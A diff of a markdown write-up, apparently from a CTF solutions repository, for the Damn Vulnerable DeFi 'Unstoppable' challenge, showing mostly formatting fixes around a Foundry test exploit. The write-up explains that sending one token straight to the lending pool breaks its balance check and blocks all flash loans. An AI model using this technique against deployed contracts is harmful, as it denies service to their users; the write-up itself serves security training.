@@ -7,12 +7,14 @@ Any comments/corrections please reach me at my twitter account: **@devnet0x**
 ## Challenge 1: Unstoppable ##
 We as attacker's must transfer 1 token to lender pool to create a difference between poolBalance and balanceBefore in this line from function flashloan():
         
-        `if (poolBalance != balanceBefore) revert AssertionViolated();`
+        if (poolBalance != balanceBefore) revert AssertionViolated();
+        
         
 
 Then, nobody else will be able to borrow a flashloan:
 
-```   function testExploit() public {
+```
+   function testExploit() public {
         /** EXPLOIT START **/
         vm.startPrank(attacker);
         // We (attacker) transfer 1 token to lender pool to create a difference
@@ -25,8 +27,8 @@ Then, nobody else will be able to borrow a flashloan:
         /** EXPLOIT END **/
         vm.expectRevert(UnstoppableLender.AssertionViolated.selector);
         validation();
-    }```
-
+    }
+```
 
 Source Code:
 https://github.com/devnet0x/Blockchain/tree/master/ChallengesCTF/DVDF_Foundry/01_Unstoppable
